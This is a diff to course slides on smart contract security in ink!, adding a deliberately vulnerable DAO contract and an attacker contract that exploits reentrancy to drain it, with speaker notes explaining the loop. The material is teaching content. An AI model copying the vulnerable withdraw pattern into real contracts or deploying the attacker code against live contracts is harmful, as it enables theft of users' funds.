@@ -1116,7 +1116,7 @@ Notes:
 
 ---
 
-## Reentrancy attacks: the fallback function
+## Reentrancy: the fallback function
 
 <!-- <img style="margin-top: 50px;margin-bottom: 50px" width="800" src="./img/ink/reentrancy.png" /> -->
 
@@ -1145,9 +1145,14 @@ Notes:
 
 ---
 
-## Reentrancy attacks: an example
+## Reentrancy: an example
 
-```rust[2-9|13-25]
+```rust[1-4|6-15|17-33]
+#[ink(storage)]
+pub struct Dao {
+    balances: Mapping<AccountId, Balance>,
+}
+
 #[ink(message, payable, selector = 0x4445504F)]
 pub fn deposit(&mut self) -> Result<(), DaoError> {
     let caller = self.env().caller();
@@ -1166,13 +1171,13 @@ pub fn withdraw(&mut self) -> Result<(), DaoError> {
 
     build_call::<DefaultEnvironment>()
         .call(caller)
-        .call_flags(CallFlags::default().set_allow_reentry(true))
+        .call_flags(CallFlags::default())
         .exec_input(ExecutionInput::new(Selector::new([0x52, 0x45, 0x43, 0x56])))
         .transferred_value(balance)
         .returns::<()>()
         .invoke();
 
-    self.balances.insert(caller, &0);
+    self.balances.remove(caller);
 
     Ok(())
 }
@@ -1181,10 +1186,57 @@ pub fn withdraw(&mut self) -> Result<(), DaoError> {
 
 Notes:
 - ink! does not have fallback functions, but it is not immune from reentrancy attacks either
-- this contract mimics the DAO - it has a deposit function for sending the funds and a 
+- this contract mimics the DAO
+- it has a mapping for maintaing balances
+- it has a deposit function for sending the funds and a withdraw for getting them all back at once
+- withdrawals calls the `callers` contract and sends the funds to a function with this 4 byte signature.
 - can anyone spot what the problem is?
+- how would you use it to craft an attack?
 
 ---
+
+## Reentrancy: attacker's code example
+
+```rust[3-9|11-12|17-22]
+#[ink(message)]
+pub fn attack(&mut self) -> Result<(), AttackerError> {
+    build_call::<DefaultEnvironment>()
+        .call(self.dao_address)
+        .call_flags(CallFlags::default().set_allow_reentry(true))
+        .exec_input(ExecutionInput::new(Selector::new([0x44, 0x45, 0x50, 0x4F])))
+        .transferred_value(ONE_AZERO)
+        .returns::<Result<(), DaoError>>()
+        .invoke()?;
+
+    let mut dao = DaoRef::from_account_id(self.dao_address);
+    dao.withdraw()?;
+
+    Ok(())
+}
+
+#[ink(message, payable, selector = 0x52454356)]
+pub fn receive(&mut self) -> Result<(), DaoError> {
+    let mut dao = DaoRef::from_account_id(self.dao_address);
+    dao.withdraw()?;
+    Ok(())
+}
+```
+
+Notes:
+- attacker deploys an SC that acts as an investor
+- it begins by depositing and this contract deposits some ETH into The DAO. 
+- This entitles the attacker to later call the `withdraw` function of the DAO to get his deposits back.
+- When the `withdraw` is called, the DAO sends back the funds by calling the payable `receive` function.
+- but this function is crafted by the attacker to maliciously call the DAOs `withdraw` again.
+- since the state is not yet updated the call does not revert and withdraw send the funds yet again.
+- this effectively creates an evil feedback loop which drains all the funds.
+- how would you fix this?
+
+---
+
+
+
+
 
 <!-- ## Common Vulnerabilities -->
 
